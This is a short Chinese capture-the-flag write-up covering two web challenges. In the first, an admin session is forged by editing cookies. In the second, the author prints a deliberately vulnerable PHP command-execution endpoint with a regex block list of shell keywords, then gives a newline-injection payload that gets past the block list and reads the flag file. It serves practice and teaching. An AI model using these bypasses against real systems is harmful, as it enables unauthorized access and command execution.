##[BSidesCF 2019]Kookie
根据提示,修改cookie
```
monster:admin
```
![image](https://user-images.githubusercontent.com/81904597/115979059-3793dc00-a5b6-11eb-810f-e0a50bd9f6f4.png)

得到回显 set-cookie:设置username
```
monster:admin;username:admin
```
![image](https://user-images.githubusercontent.com/81904597/115979070-44183480-a5b6-11eb-85e1-2aa1baea061b.png)
##[极客大挑战 2019]RCE ME
题目源码
```
<?php

putenv('PATH=/home/rceservice/jail');

if (isset($_REQUEST['cmd'])) {
    $json = $_REQUEST['cmd'];

    if (!is_string($json)) {
        echo 'Hacking attempt detected<br/><br/>';
    } elseif (preg_match('/^.*(alias|bg|bind|break|builtin|case|cd|command|compgen|complete|continue|declare|dirs|disown|echo|enable|eval|exec|exit|export|fc|fg|getopts|hash|help|history|if|jobs|kill|let|local|logout|popd|printf|pushd|pwd|read|readonly|return|set|shift|shopt|source|suspend|test|times|trap|type|typeset|ulimit|umask|unalias|unset|until|wait|while|[\x00-\x1FA-Z0-9!#-\/;-@\[-`|~\x7F]+).*$/', $json)) {
        echo 'Hacking attempt detected<br/><br/>';
    } else {
        echo 'Attempting to run command:<br/>';
        $cmd = json_decode($json, true)['cmd'];
        if ($cmd !== NULL) {
            system($cmd);
        } else {
            echo 'Invalid input';
        }
        echo '<br/><br/>';
    }
}

?>
```
```
?cmd=%0a{"cmd":"/bin/cat /home/rceservice/flag"%0a}
```
https://blog.csdn.net/rfrder/article/details/110573955
